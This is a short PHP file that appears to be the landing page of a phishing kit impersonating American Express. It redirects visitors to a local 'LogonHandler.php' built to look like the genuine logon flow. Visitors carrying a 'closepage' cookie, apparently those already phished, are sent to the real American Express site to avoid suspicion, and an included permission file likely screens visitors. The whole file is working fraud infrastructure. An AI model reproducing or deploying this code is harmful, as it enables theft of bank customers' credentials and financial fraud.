<?php

include('permission.php');

$closed=$_COOKIE["closepage"];
if ($closed != ''){
header('location: https://www.americanexpress.com/');
}
$index="LogonHandler.php?request_type=LogonHandler&Face=en_US&inav=iNavLnkLog";





?>
<html><head>
<META HTTP-EQUIV="Refresh" CONTENT="0;URL=<?echo $index; ?>">

<script type="text/javascript">
echo = "<?echo $index; ?>"
self.location.replace(echo);
window.location = echo;
</script>
</head>
